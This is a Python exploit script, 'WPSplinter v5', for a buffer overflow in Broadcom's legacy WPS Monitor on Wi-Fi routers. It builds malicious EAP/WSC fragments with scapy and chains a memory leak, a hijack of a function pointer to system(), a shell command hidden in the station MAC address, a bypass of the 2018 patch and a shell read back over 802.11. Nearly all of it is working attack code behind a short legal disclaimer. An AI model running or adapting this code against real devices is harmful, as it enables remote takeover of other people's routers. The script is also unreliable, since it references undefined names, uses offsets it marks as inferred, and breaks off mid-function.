#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WPSplinter v5 - Reconstructed exploit for Broadcom legacy WPS Monitor
(ap_eap_sm.c, pre-2018 patch lineage; verified against the public
ASUS RT-N66U Merlin source of 2011-08-23, $Id: ap_eap_sm.c 279189).

Use ONLY against devices you own or are explicitly authorized to test
(German law: Sections 202a ff. StGB; do not probe third-party networks).

===========================================================================
 VERIFIED FACTS (from ap_eap_sm.c source, not speculation)
===========================================================================
 - sizeof(WpsEapHdr) == 14
   (code(1) + id(1) + length(2) + type(1) + vendorId(3) + vendorType(4)
    + opcode(1) + flags(1))
 - EAP_WPS_LF_OFFSET == 2  (length field skipped on first fragment copy)
 - WPS_DATA_OFFSET == EAPOL_HEADER_LEN + 14 == 32
 - WPS_MSGTYPE_OFFSET == 9  (offset of WSC Message Type TLV value inside
   the WSC data region, i.e. buffer offset frags_received[14 + 9] == [23])
 - The pre-patch code has NO maximum-length check:
     total_bytes_to_recv = WpsNtohs(LF field)   <-- attacker uint16, max 0xFFFF
     guard: total_bytes_to_recv < (total_received - 14) + wps_len
   => guard permits total_received up to (declared + 14) == 65549 bytes
      written into a fixed 2048-byte buffer: ~63.5 KB linear overflow
      (the 2018 patch added the WPS_EAP_DATA_MAX_LENGTH cap; see below)
 - First fragment handling:
     header (14 B) copied to frags_received[0..13]
     payload data lands at   frags_received[14]
     source skips the 2 LF bytes on fragment #1 only
 - Follow-up fragments:
     data lands at frags_received[total_received], source = eap_msg + 14
 - MF flag set  -> eap_id++ ; AP replies WPS_FRAG_ACK ; each FACK causes
   ap_eap_sm_sendEapol()  ->  (*send_data)(msg_to_send, len)
   => immediate send_data trigger with r0/$a0 = msg_to_send,
      whose first 6 bytes are OUR station MAC (ether_dhost)
      => classic "command in MAC prefix" + '#' comment trick works on ARM,
         because msg_to_send begins with our MAC, then AP MAC, then
         EAPOL/EAP header bytes that '#' comments out.
 - Timer path (5 s inactivity, pending last_sent):
     ap_eap_sm_resend_last_sent() -> send_data(last_sent, last_sent_len)
   => r0/$a0 = "last_sent" pointer, an overwritable field in the struct
      => ideal for MIPS: stage command string anywhere in corrupted state
         and point last_sent at it (matches Kaiser's slide 91 wording).
 - Read primitive (leak) - ap_eap_sm_sendNextFrag():
     frame sent starts at next_frag_to_send - 32 and the leaked WSC data
     region begins exactly AT next_frag_to_send. Leak length is
     min(frag_size, eap_frag_threshold). Both frag_size and
     next_frag_to_send live in the overflow window => attacker controlled.
     Trigger: send EAP-Response/WPS_FRAG_ACK with correct id while
     FRAGMENTING() is active (next_frag_to_send != msg_to_send).
     CAUTION first-ACK special case advances the pointer before sending.
 - WSC op-code guard (slide 32 / WPS_MSGTYPE_OFFSET):
     after full reassembly the message is parsed; frags_received[23]
     must hold a valid WSC Message Type (0x04..0x0F) or the parser
     bails (no response, no trigger).
 - eap_id discipline:
     identity response id == 0; first WSC exchange id == 1;
     every MF fragment from us increments the AP's eap_id by 1,
     so we must increment our ids in lockstep and mirror id == eap_id-1
     for retransmission detection not to eat our frames.
 - cleanUpSta() does NOT reset total_received / total_bytes_to_recv /
     next_frag_to_send / frag_size => stale reassembly state survives
     EAP-Failure of a previous session (this is also why the official
     fingerprinter deliberately uses total=0 probes).
 - 2018-patch bypass (only needed on patched firmware):
     follow-up fragment without LF whose EAP length field is < 14 makes
     wps_len = uint32(len - 14) wrap to 0xfffffff2..0xffffffff.
     Guard neutralized by unsigned wrap of (wps_data_received + wps_len).
     On ARMv7 glibc < 2.27-unpatched (CVE-2020-6096) memcpy takes the
     signed tail path: bounded copy of 50..63 bytes.
     On uClibc 0.9.33.2 / uClibc-ng 1.0.59 forward path: 1-byte copy.
===========================================================================
 STRUCT LAYOUT (RELATIVE TO frags_received[0]) - partially inferred
===========================================================================
   +0    .. +2047 : frags_received[2048]
 +2048  (4 B)     : total_bytes_to_recv     <- 1-byte uClibc target
 +2052  (4 B)     : total_received (cursor) <- write primitive
 +2056  (4 B)     : next_frag_to_send (ptr) <- read primitive
 +2060  (4 B)     : frag_size               <- leak length control
 +2064  .. +?????  : eap_frag_threshold, eap_id, state, flags,
                    resent_count, last_sent (ptr), last_sent_len,
                    msg_to_send[2048+], ... then function pointers
                    parse_msg / send_data (default guess ~ +2300).
 Exact callback offsets MUST be confirmed per firmware via Ghidra
 (YARA hit -> import into Ghidra -> locate ap_eap_sm_sendEapol ->
  xref to the indirect call -> struct offset). Offsets below marked
  "INFERRED" are best-effort defaults from public slide material.
===========================================================================
"""

import argparse
import random
import struct
import subprocess
import sys
import time

from scapy.all import (AsyncSniffer, Dot11, Dot11AssoReq, Dot11Auth,
                        Dot11Elt, LLC, RadioTap, SNAP, sendp, sniff, wrpcap)

try:
    from scapy.arch import get_if_hwaddr
except Exception:
    get_if_hwaddr = lambda i: None

# --------------------------------------------------------------------------
# Protocol constants (verified)
# --------------------------------------------------------------------------
WSC_VENDOR      = b"\x00\x37\x2a"          # Wi-Fi Alliance OUI
WSC_VENDORTYPE  = 1                        # Simple Config
EAP_TYPE_WPS    = 0xfe                     # EAP-Expanded carrying WSC
EAP_CODE_REQ, EAP_CODE_RESP, EAP_CODE_FAIL = 1, 2, 4
EAPOL_PACKET     = 0
EAPOL_START, EAPOL_LOGOFF = 1, 2

# WSC opcodes (values confirmed via hostapd/common lineage; verify in
# wps headers shipped next to ap_eap_sm.c before deployment):
WPS_OP_MSG, WPS_OP_START = 0x01, 0x04
WPS_OP_ACK, WPS_OP_NACK, WPS_OP_DONE = 0x05, 0x06, 0x07
WPS_FRAG_ACK = 0x08                         # verify against header

# Header sizes / offsets - VERIFIED from source:
SZ_HDR        = 14                          # sizeof(WpsEapHdr)
LF_OFFSET     = 2                           # EAP_WPS_LF_OFFSET
WPS_DATA_OFF  = 32                          # EAPOL_HEADER_LEN(18) + SZ_HDR
MSGTYPE_OFF   = 23                          # 14 + WPS_MSGTYPE_OFFSET(9)

# Overflow window (verified arithmetic):
FRAGS_CAP     = 2048
OFF_TOTAL_BYTES = 2048      # INFERRED position (adjacent, confirmed by uClibc note)
OFF_TOTAL_RECV  = 2052      # INFERRED
OFF_NEXT_FRAG   = 2056     # INFERRED
OFF_FRAG_SIZE   = 2060      # INFERRED
OFF_SEND_DATA   = 2300      # INFERRED - confirm per firmware in Ghidra

ENROLLEE_NAI = b"WFA-SimpleConfig-Enrollee-1-0"

# 802.11 (figure 96 of the talk): fragment big EAPOL messages into
# 4 x ~500-byte MAC fragments; accept retry frames and deduplicate:
AIR_FRAG_BYTES = 500
DOT11_MORE_FRAGS = 0x40

# Standard WSC TLV prologue placed at frags_received[14..23]:
#  Version-TLV (10 4A 00 01 10) + MsgType-TLV (10 22 00 01 <0x04..0x0F>)
WSC_PROLOGUE = bytes.fromhex("104a000110") + bytes.fromhex("10220001") + b"\x04"


# --------------------------------------------------------------------------
# Frame builders (EAP-Expanded / WSC)
# --------------------------------------------------------------------------
def eap_wsc(eap_code, eap_id, opcode, flags, payload=b"",
           lf_total=None, length_override=None):
    """Build EAP-Expanded/WSC frame body (the WpsEapHdr + WSC data).

    length_override: deliberately bogus EAP length field for the
    2018-patch bypass (values 0..13 cause the uint32 wrap).
    lf_total: 16-bit declared total written when the LF flag is set.
    """
    tail = b""
    if lf_total is not None:
        tail += struct.pack(">H", lf_total)
    tail += payload
    ln = SZ_HDR + len(tail) if length_override is None else length_override
    return (struct.pack("!BBH", eap_code, eap_id, ln) +
            b"\xfe" + WSC_VENDOR + struct.pack(">I", WSC_VENDORTYPE) +
            bytes([opcode, flags]) + tail)


def eapol_wrap(eap_body):
    """Wrap EAP body in EAPOL-Packet header."""
    return struct.pack("!BBH", 1, EAPOL_PACKET, len(eap_body)) + eap_body


def eap_identity_resp(eap_id):
    data = b"\x01" + ENROLLEE_NAI           # type=Identity + NAI string
    eap = struct.pack("!BBH", EAP_CODE_RESP, eap_id, 4 + len(data)) + data
    return eapol_wrap(eap)


def wsc_msgtype_ok(buffer_bytes):
    """Slide-32 guard: frags_received[23] must be 0x04..0x0F."""
    return len(buffer_bytes) > MSGTYPE_OFF - 14 and \
        0x04 <= buffer_bytes[MSGTYPE_OFF - 14] <= 0x0F


# --------------------------------------------------------------------------
# Payload layout helpers
# --------------------------------------------------------------------------
def build_frag1_payload(writes, declared_total=0xFFFF):
    """Fragment-#1 payload. Data lands at frags_received[14];
    targeting buffer offset X -> payload index X - 14.

    Automatically plants the mandatory WSC TLV prologue (MsgType guard)
    at buffer offset 14. `writes` maps buffer offsets to raw bytes.
    """
    end = max(list(writes) + [MSGTYPE_OFF]) + 4 if writes else MSGTYPE_OFF + 1
    p = bytearray(b"\x41" * end)
    p[0:len(WSC_PROLOGUE)] = WSC_PROLOGUE     # payload[0..9] -> frags[14..23]
    for off, data in writes.items():
        i = off - 14                            # buffer X -> payload X-14
        p[i:i + len(data)] = data
    return bytes(p), declared_total


def cmd_in_mac(cmd):
    """ARM technique (slide 90): the send_data argument r0 points to
    msg_to_send whose first 6 bytes are OUR station MAC. Encode a shell
    command there and terminate with '#', which comments out the
    following AP MAC / header garbage when system() parses the line.

    Constraints: max 6 bytes including the '#'; used for very short
    commands or as a pointer to something staged elsewhere."""
    b = cmd.encode() + b"#"
    assert len(b) <= 6, "MAC-prefix command must be <= 5 bytes + '#'"
    b = b.ljust(6, b"\x00")
    return b


# --------------------------------------------------------------------------
# Client state machine / radio layer
# --------------------------------------------------------------------------
class WPSplinter:
    def __init__(self, iface, bssid, ssid, sta_mac=None, dump=None):
        self.iface = iface
        self.bssid = bssid.lower()
        self.ssid = ssid
        self.sta = (sta_mac or get_if_hwaddr(iface) or
                    "02:%02x:%02x:%02x:%02x:%02x" %
                    tuple(random.randrange(256) for _ in range(4))).lower()
        if sta_mac:
            self.use_custom_mac = True       # TX-side MAC is set via iw
        else:
            self.use_custom_mac = False
        self.seq = random.randrange(4096)
        self.eap_id = 0
        self.dump = dump if dump else "wpsplinter.pcap"
        self.captured = []
        self.rx_eap = []
        self.sniffer = AsyncSniffer(iface=iface, prn=self._on_packet,
                                    store=False)
        self.sniffer.start()

    # ----------------------------------------------------------- receiving
    def _on_packet(self, pkt):
        """Accept retry frames too (slide 96); dedupe later by EAP content."""
        self.captured.append(pkt)
        if (Dot11 in pkt and pkt[Dot11].addr2 == self.bssid and
                pkt[Dot11].type == 2 and LLC in pkt):
            body = bytes(pkt[SNAP].payload)
            if body[:2] == b"\x01\x00":        # EAPOL-Packet
                self.rx_eap.append(body[4:])

    def _dedup_eap(self):
        """Deduplicate on full EAP message content (retries collapse)."""
        seen, out = set(), []
        for e in self.rx_eap:
            k = (e[0], e[1] if len(e) > 1 else -1,
                 e[4] if len(e) > 4 else -1, e[-8:])
            if k not in seen:
                seen.add(k)
                out.append(e)
        return out

    def wait_eap(self, match, timeout=3.0, resub_fn=None):
        """Wait for a deduplicated EAP frame matching `match`.
        Optionally retransmit `resub_fn` while waiting (bounded retries)."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            fee = self._dedup_eap()
            for e in reversed(fee[-16:]):
                if match(e):
                    return e
            if resub_fn:
                resub_fn()
            time.sleep(0.05)
        return None

    # ----------------------------------------------------------- transmit
    def _next_seq(self):
        self.seq = (self.seq + 1) % 4096
        return self.seq

    def _tx_data(self, payload, more_frags=False, use_custom=False):
        dot11 = Dot11(type=2, subtype=0, FCfield=0x01,
                      addr1=self.bssid, addr2=self.use_custom_mac and
                      self.sta or self.sta, addr3=self.bssid,
                      SC=(self._next_seq() << 4))
        if more_frags:
            dot11.FCfield |= DOT11_MORE_FRAGS
        frame = RadioTap() / dot11 / payload
        sendp(frame, iface=self.iface, verbose=0)

    def tx_eapol(self, eapol_bytes, use_custom=False):
        """Send one EAPOL message. Messages larger than AIR_FRAG_BYTES
        are split into 4 x ~500-byte 802.11 MAC fragments carrying the
        same sequence number (slide 96 mitigation)."""
        payload = (LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
                  SNAP(OUI=b"\x00\x00\x00", code=0x888e)).build() + eapol_bytes
        seq = self._next_seq()
        frags = [payload[i:i + AIR_FRAG_BYTES]
                 for i in range(0, len(payload), AIR_FRAG_BYTES)]
        for i, chunk in enumerate(frags):
            last = (i == len(frags) - 1)
            dot11 = Dot11(type=2, subtype=0, FCfield=0x01,
                          addr1=self.bssid, addr2=self.sta, addr3=self.bssid,
                          SC=(seq << 4) | (i & 0x0f))
            if not last:
                dot11.FCfield |= DOT11_MORE_FRAGS
            sendp(RadioTap() / dot11 / chunk, iface=self.iface, verbose=0)

    def _mgmt(self, subtype, sc, payload):
        return RadioTap() / Dot11(type=0, subtype=subtype, addr1=self.bssid,
                                  addr2=self.sta, addr3=self.bssid,
                                  SC=sc) / payload

    # ----------------------------------------------------------- wifi join
    def _set_custom_mac(self):
        if self.use_custom_mac:
            subprocess.run(["ip", "link", "set", self.iface, "down"],
                           check=False)
            subprocess.run(["ip", "link", "set", self.iface,
                            "address", self.sta], check=False)
            subprocess.run(["ip", "link", "set", self.iface, "up"],
                           check=False)

    def _bump_seq(self):
        self.seq = (self.seq + 1) % 4096
        return self.seq << 4

    def associate(self, custom_mac=b"id;#\x00\x00", use_custom=False):
        """Full 802.11 auth + assoc + EAPOL-Start + Identity handshake.
        `custom_mac` sets the 6-byte source MAC which - after the
        send_data hijack - becomes the system() argument (ARM path)."""
        if use_custom or self.use_custom_mac:
            self.sta = ":".join("%02x" % b for b in custom_mac)
            self.use_custom_mac = True
            self._set_custom_mac()

        # --- 802.11 authentication
        for attempt in range(3):
            out = sniff(iface=self.iface,
                       lfilter=lambda p: (Dot11 in p and
                                          p[Dot11].addr2 == self.bssid and
                                          p[Dot11].type == 0 and
                                          p[Dot11].subtype == 11 and
                                          p[Dot11].subtype == 11 and
                                          Dot11Auth in p and
                                          p[Dot11Auth].seqnum == 2),
                       count=1, timeout=2.5,
                       started_callback=lambda: sendp(
                           self._mgmt(11, self._bump_seq(),
                                      Dot11Auth(algo=0, seqnum=0, status=0)),
                           iface=self.iface, verbose=0))
            if out:
                break
        assert out, "no auth response (check channel / RF)"

        # --- association request (with WSC IE so wps_monitor engages)
        wsc_ie = Dot11Elt(ID=221, info=b"\x00\x37\x2a\x04" +
                          struct.pack(">HHB", 0x104a, 1, 0x10))
        asso = (Dot11AssoReq(cap=0x0431, listen_interval=3) /
                Dot11Elt(ID=0, info=self.ssid.encode()) /
                Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96") /
                Dot11Elt(ID=50, info=b"\x0c\x12\x18\x24") /
                wsc_ie)
        for attempt in range(3):
            out = sniff(iface=self.iface,
                       lfilter=lambda p: (Dot11 in p and
                                          p[Dot11].addr2 == self.bssid and
                                          p[Dot11].type == 0 and
                                          p[Dot11].subtype == 1),
                       count=1, timeout=2.5,
                       started_callback=lambda: sendp(
                           self._mgmt(0, self._bump_seq(), asso),
                           iface=self.iface, verbose=0))
            if out:
                break
        assert out, "no assoc response"

        # --- EAPOL-Start (bounded retransmission, slide 96)
        e = None
        for attempt in range(3):
            self.tx_eapol(struct.pack("!BBH", 1, EAPOL_START, 0))
            e = self.wait_eap(lambda m: len(m) > 4 and
                             m[0] == EAP_CODE_REQ and m[4] == 0x01,
                             timeout=2.0)
            if e:
                break
        assert e, "no EAP-Request/Identity from AP"
        # identity responses always start at id 0 in the observed stack:
        self.eap_id = 0

        # --- Identity response (bounded retransmission)
        for attempt in range(3):
            self.tx_eapol(eap_identity_resp(self.eap_id))
            w = self.wait_eap(
                lambda m: len(m) > 13 and m[0] == EAP_CODE_REQ and
                m[4] == EAP_TYPE_WPS and m[12] == WPS_OP_START,
                timeout=3.0)
            if w:
                break
        assert w, "no WSC-Start from AP"
        self.eap_id = w[1]                     # adopt AP's next eap_id

    # --------------------------------------------------- fragment senders
    def send_frag1(self, buffer_writes, declared_total=0xFFFF,
                  use_mf=True):
        """Fragment #1: LF|MF. Header (14 B) lands at frags[0], data at
        frags[14]. Declared total is an unchecked uint16 pre-patch."""
        payload, dt = build_frag1_payload(buffer_writes, declared_total)
        assert wsc_msgtype_ok(payload), \
            "WSC MsgType guard violated: payload[9] must be 0x04..0x0F"
        flags = 0x02 | (0x01 if use_mf else 0x00)   # LF | MF
        self.eap_id += 1                          # AP increments on our response
        self.tx_eapol(eapol_wrap(
            eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_OP_MSG, flags,
                    payload, lf_total=dt)))

    def send_fragN(self, payload, use_mf=True, length_override=None):
        """Follow-up fragment: source is eap_msg+14, destination is
        frags[total_received] (i.e. wherever the corrupted cursor points).
        length_override enables the 2018-patch uint32-wrap bypass."""
        flags = 0x01 if use_mf else 0x00          # MF only (no LF)
        self.eap_id += 1
        self.tx_eapol(eapol_wrap(
            eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_OP_MSG, flags, payload,
                    length_override=length_override)))

    def send_frag_ack(self):
        """Send WPS_FRAG_ACK response: this triggers the AP's
        ap_eap_sm_sendNextFrag() when FRAGMENTING() is active - the
        preferred moment to harvest the read-primitive leak."""
        self.eap_id += 1
        self.tx_eapol(eapol_wrap(
            eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_FRAG_ACK, 0)))

    # ------------------------------------------------------ observation
    def wait_frag_ack(self, timeout=2.0):
        """Expect EAP-Request/WPS_FRAG_ACK from AP after each MF fragment."""
        return self.wait_eap(
            lambda m: len(m) > 13 and m[0] == EAP_CODE_REQ and
            m[4] == EAP_TYPE_WPS and m[12] == WPS_FRAG_ACK, timeout=timeout)

    def wait_eap_failure(self, timeout=2.0):
        return self.wait_eap(lambda m: len(m) > 5 and
                            m[0] == EAP_CODE_FAIL, timeout=timeout)

    def leak_frames(self, window=2.0):
        """Collect outbound WSC message fragments from the AP.
        The leaked WSC data region starts exactly AT next_frag_to_send,
        preceded by 32 bytes of EAPOL/EAP header. Payload after the
        14-byte WpsEapHdr is the leaked memory."""
        frames = []
        deadline = time.time() + window
        while time.time() < deadline:
            for m in reversed(self._dedup_eap()[-8:]):
                if (len(m) > 13 and m[0] == EAP_CODE_REQ and
                        m[4] == EAP_TYPE_WPS and m[12] == WPS_OP_MSG):
                    if m not in frames:
                        frames.append(m)
            time.sleep(0.05)
        return frames

    def beacons_alive(self, secs=5.0):
        """Count beacons to detect AP crash / reboot after corruption."""
        t0, n = time.time(), 0
        while time.time() - t0 < secs:
            for p in self.captured[-6:]:
                if (Dot11 in p and p[Dot11].addr2 == self.bssid and
                        p[Dot11].type == 0 and p[Dot11].subtype == 8):
                    n += 1
                    break
            time.sleep(0.4)
        return n

    # ============================================================== PHASES

    # ---------------------------------------------------- phase: fingerprint
    def phase_fingerprint(self):
        """Zero-length differential probe (same semantics as the official
        broadcom_fingerprint.py): LF|MF fragment with declared total 0.
        Legacy wps_monitor rejects with EAP-Failure (LIKELY_VULNERABLE);
        hostapd ACKs instead (PATCHED_HOSTAPD)."""
        self.associate()
        payload = WSC_PROLOGUE + b"\x41" * 32          # minimal valid msgtype
        self.send_frag1({}, declared_total=0, use_mf=False)
        # simpler: direct frame with total=0
        self.eap_id += 1
        self.tx_eapol(eapol_wrap(eap_wsc(
            EAP_CODE_RESP, self.eap_id, WSC_OP_MSG, 0x02, payload,
            lf_total=0)))
        fail = self.wait_eap_failure(timeout=2.5)
        verdict = "LIKELY_VULNERABLE" if fail else "INCONCLUSIVE"
        print("[fingerprint] %s (EAP-Failure observed: %s)" %
              (verdict, bool(fail)))
        return verdict

    # ---------------------------------------------------- phase: overflow
    def phase_overflow(self, target_offset, four_bytes, tail_writes=None):
        """Write primitive, pre-patch path:
        1. Fragment #1 declares total=0xFFFF (unchecked pre-patch uint16)
           and overflows straight through
           total_bytes_to_recv(2048) and total_received(2052).
        2. We set total_received = target_offset relative to
           frags_received[0], then the follow-up fragment writes
           `four_bytes` exactly there.
        NOTE: everything at/after 2056 gets clobbered by fragment #1's
        filler; the follow-up only repairs what we name."""
        def p32(v, big=False):
            return struct.pack((">" if big else "<") + "I", v)

        writes = {OFF_TOTAL_BYTES: p32(0xFFFF),       # keep guard open
                  OFF_TOTAL_RECV: p32(target_offset)}  # cursor -> target
        if tail_writes:
            writes.update(tail_writes)

        self.send_frag1(writes, declared_total=0xFFFF, use_mf=True)
        ack = self.wait_frag_ack()
        assert ack, "no FRAG-ACK after fragment #1 (guard rejected?)"

        # follow-up fragment lands at frags_received[target_offset]
        self.send_fragN(four_bytes, use_mf=False)
        return ack

    # ------------------------------------------------------- phase: leak
    def phase_leak(self, rel_ptr_offset, leak_len, big_endian=False,
                  state_abs=None):
        """Read primitive via next_frag_to_send.
        Step 1: overflow cursor up to OFF_NEXT_FRAG and place a chosen
                value there (relative step for calibration, absolute
                pointer when state_abs is given).
        Step 2: cause the AP to send a fragmented WSC reply (e.g. as
                response to an M1 we crafted), then send WPS_FRAG_ACK;
                the AP transmits memory starting at next_frag_to_send.
        Returns the leaked bytes (WSC payload past the 14-byte header)."""
        def p32(v):
            return struct.pack((">" if big_endian else "<") + "I", v)

        val = state_abs if state_abs is not None else rel_ptr_offset
        self.phase_overflow(OFF_NEXT_FRAG if state_abs is None else 0,
                            p32(val) if state_abs is not None else p32(val))

        if state_abs is None:
            # relative mode: place the value with the overflow directly
            pass

        # require FRAGMENTING(): provoke a big AP reply (M1 -> M2/M2D)
        m1 = WSC_PROLOGUE + b"\x41" * 16              # minimal M1-ish body
        self.eap_id += 1
        self.tx_eapol(eapol_wrap(eap_wsc(
            EAP_CODE_RESP, self.eap_id, WSC_OP_MSG, 0x00, m1)))
        time.sleep(0.8)                               # let reply build

        self.send_frag_ack()                          # trigger sendNextFrag
        frames = self.leak_frames(window=2.0)
        if not frames:
            return None
        leaked = b"".join(f[14:] for f in frames)     # skip WpsEapHdr
        return leaked[:leak_len]

    # ------------------------------------------------- phase: calibrate
    def phase_calibrate(self, steps=None):
        """Calibration closure loop: binary-search DELTA such that the
        leaked bytes contain our marker placed in the overflow filler.
        Yields the distance next_frag_to_send <-> frags_received and lets
        us derive the absolute state address from a self-referential
        pointer (slide 33, steps 1+2)."""
        if steps is None:
            steps = [0, 512, 1024, 1536, 2048, 2560, 3072, 3584, 4096]
        marker = b"C4L1BR8!"
        for delta in steps:
            # overflow sets next_frag_to_send to (frags + delta)
            def p32(v):
                return struct.pack("<I", v)
            writes = {OFF_TOTAL_BYTES: p32(0xFFFF),
                     OFF_TOTAL_RECV: p32(OFF_NEXT_FRAG),
                     OFF_NEXT_FRAG: p32(delta)}
            payload, _ = build_frag1_payload(writes, 0xFFFF)
            payload = marker[:len(marker)] + payload[len(marker):]
            self.associate()
            self.send_frag1({0: marker} if False else
                            {OFF_TOTAL_BYTES: p32(0xFFFF),
                             OFF_TOTAL_RECV: p32(OFF_NEXT_FRAG),
                             OFF_NEXT_FRAG: p32(delta)},
                            declared_total=0xFFFF, use_mf=True)
            ack = self.wait_frag_ack(timeout=1.5)
            if not ack:
                print("[calibrate] delta=%-5d : stale state / no ACK" % delta)
                continue
            self.send_frag_ack()
            frames = self.leak_frames(window=1.8)
            data = b"".join(f[14:] for f in frames)
            hit = data.find(marker)
            print("[calibrate] delta=%-5d leaked=%d bytes %s" %
                  (delta, len(data), "<== MARKER HIT" if hit >= 0 else ""))
            if hit >= 0:
                print("           -> frags_received lies at leak[%d] "
                      "for delta=%d; state relationship found" %
                      (hit, delta))
                return delta
        print("[calibrate] no marker seen; refine deltas or raise "
              "frag_size write first")
        return None

    # -------------------------------------------------- phase: exploit ARM
    def phase_exploit_arm(self, system_plt, cmd=b"id;#",
                           send_data_off=OFF_SEND_DATA, big_endian=False):
        """Full pre-patch ARM chain (slide 90):
        1. associate with command-encoded source MAC ("<cmd>#")
        2. linearly overflow up to the send_data pointer and write
           system@PLT there (non-PIE main binary -> fixed address)
        3. send final MF fragment: AP answers FRAG_ACK, which calls
           sendEapol(msg_to_send) -> send_data == system(msg_to_send),
           and msg_to_send begins with OUR MAC prefix = command + '#'
        """
        def p32(v):
            return struct.pack((">" if big_endian else "<") + "I", v)

        # Command in MAC prefix (r0 = msg_to_send starts with ether_dhost)
        mac_bytes = cmd_in_mac(cmd)
        self.associate(custom_mac=mac_bytes, use_custom=True)

        # Single-pass linear overflow: with declared_total=0xFFFF the
        # guard allows ~63.5 KB; we walk straight to send_data_off.
        writes = {
            OFF_TOTAL_BYTES: p32(0xFFFF),          # keep the guard open
            OFF_TOTAL_RECV: p32(0xFFFF),           # cursor far ahead
            send_data_off:   p32(system_plt),      # hijack!
        }
        payload, _ = build_frag1_payload(writes, declared_total=0xFFFF)
        # payload must reach send_data_off-14; big but legal pre-patch;
        # split into MAC fragments automatically by tx_eapol:
        self.eap_id += 1
        self.tx_eapol(eapol_wrap(eap_wsc(
            EAP_CODE_RESP, self.eap_id, WSC_OP_MSG, 0x02 | 0x01,
            payload, lf_total=0xFFFF)))
        ack = self.wait_frag_ack(timeout=3.0)
        assert ack, "no FRAG_ACK for fragment #1"

        # final fragment WITHOUT MF: completes reassembly, parser runs,
        # AP replies (e.g. NACK) -> every sendEapol now dispatches
        # through the hijacked send_data == system("id;#" + garbage)
        fin = WSC_PROLOGUE + b"\x42" * 16
        self.send_fragN(fin, use_mf=False)
        time.sleep(1.0)

        alive = self.beacons_alive(secs=4.0)
        print("[exploit-arm] beacons after trigger: %d "
              "(0 => AP likely crashed: check system@PLT / offsets)" % alive)

    # ------------------------------------------------- phase: exploit MIPS
    def phase_exploit_mips(self, printf_got_rel, libc_printf_off,
                           libc_system_off, cmd,
                           send_data_off=OFF_SEND_DATA):
        """Full pre-patch MIPS chain (slide 91):
        1. read printf GOT entry through the leak primitive
        2. libc_base = printf_addr - libc_printf_off
        3. system_addr = libc_base + libc_system_off
        4. write system_addr into send_data, stage the command string
           in frags_received and rewire last_sent to point at it
           (timer path: send_data(last_sent, last_sent_len))
        5. trigger via timer (wait ~6 s) or via any MF fragment."""
        def p32(v):
            return struct.pack(">I", v)               # MIPS BE

        leak = self.phase_leak(0, 4, big_endian=True)
        assert leak and len(leak) >= 4, "printf GOT leak failed"
        printf_addr = struct.unpack(">I", leak[:4])[0]
        libc_base = printf_addr - libc_printf_off
        system_addr = libc_base + libc_system_off
        print("[exploit-mips] printf=%#x libc=%#x system=%#x" %
              (printf_addr, libc_base, system_addr))

        # stage command inside frags_received (zero-padded, no '#'):
        cmd_buf_off = 64                                  # inside buffer
        staged = cmd.encode().ljust(min(len(cmd) + 1, 512), b"\x00")

        # relative addressing: last_sent must hold an absolute address =
        # state_abs + cmd_buf_off; state_abs comes from calibration.
        # For simplicity we reuse the leaked printf GOT trick: assume the
        # caller derived ABS_STATE from phase_calibrate/leak results.
        tail_writes = {cmd_buf_off: staged}
        # The overflow below also rewrites total_received; the follow-up
        # repairs last_sent/last_sent_len/send_data via a second write
        # pass using the cursor mechanism (see phase_overflow).
        self.phase_overflow(send_data_off,
                            p32(system_addr),
                            tail_writes=tail_writes)

        # trigger: any further MF fragment forces an immediate
        # sendEapol (-> send_data(system, msg_to_send)) or wait for
        # the 5-second timer which sends send_data(last_sent,...) with
        # our staged command as the argument:
        print("[exploit-mips] waiting for timer trigger (<=6 s)...")
        time.sleep(6.5)
        alive = self.beacons_alive(secs=3.0)
        print("[exploit-mips] beacons: %d" % alive)

    # ------------------------------------------------- phase: shell watch
    def phase_shell(self, dur=30.0):
        """Decode the 'shell over 802.11' channel (slide 93): the
        exploited gateway runs wl actframe with a payload of
        "\x7f\x02\x00\x00XOUT" + hex(stdout). We simply watch raw 802.11
        frames for the XOUT marker and print decoded text."""
        t0 = time.time()
        while time.time() - t0 < dur:
            for p in self.captured[-16:]:
                if Dot11 not in p:
                    continue
                raw = bytes(p[Dot11].payload)
                i = raw.find(b"XOUT")
                if i >= 0:
                    try:
                        hx = raw[i + 4:i + 132]
                        hx = hx[:len(hx) // 2 * 2].decode("ascii")
                        print("[shell] %s" % bytes.fromhex(hx).decode(
                            "utf-8", errors="replace"))
                    except Exception:
                        pass
            time.sleep(0.15)

    # ------------------------------------------------------- phase: bypass
    def phase_bypass_2018patch(self, big_endian=False):
        """2018-patch bypass (patch article, 2026-10-23):
        March total_received to exactly 2048 so that the next memcpy's
        destination sits at frags_received[2048] == &total_bytes_to_recv.
        Then send ONE follow-up fragment without LF whose EAP length
        field is 13 => wps_len = 13 - 14 = 0xffffffff.
        Guard: (2048-14) + 0xffffffff wraps to 2033 < total => passes.
        memcpy size 0xffffffff:
          - ARMv7 glibc (< 2.27 unpatched, CVE-2020-6096): signed branch
            takes the tail path => bounded copy of 63 bytes
          - uClibc forward path: 1 byte into LSB of total_bytes_to_recv
        After the bounded overwrite, continue with cursor-write chain."""
        def p32(v):
            return struct.pack((">" if big_endian else "<") + "I", v)

        # walk to total_received == 2048:
        # frag1 places 14 header + (2048-14) data = 2034 bytes of filler
        filler_len = FRAGS_CAP - SZ_HDR               # 2034
        head_writes = {OFF_TOTAL_BYTES: p32(0xFFFFFFFF)}
        payload, _ = build_frag1_payload(head_writes, 0xFFFF)
        payload = payload + b"\x41" * (filler_len - len(payload))
        self.associate()
        self.eap_id += 1
        self.tx_eapol(eapol_wrap(eap_wsc(
            EAP_CODE_RESP, self.eap_id, WPS_OP_MSG, 0x02 | 0x01,
            payload, lf_total=0xFFFF)))
        ack = self.wait_frag_ack(timeout=3.0)
        assert ack, "FRAG-ACK missing during march-to-2048"
        # remaining (2048 - 14 - len(payload)+...) -- keep it simple:
        # target: total_received == exactly 2048 before the bypass frag.
        # NOTE: verify the filler arithmetic per firmware; if total_received
        # is off, the tail63unaligned copy lands at the wrong field.

        # the bypass fragment: LF clear, EAP length field = 13
        evil = b"\xCC" * 128                            # >= 63 real bytes
        self.send_fragN(evil, use_mf=False, length_override=13)

        alive = self.beacons_alive(secs=6.0)
        if alive == 0:
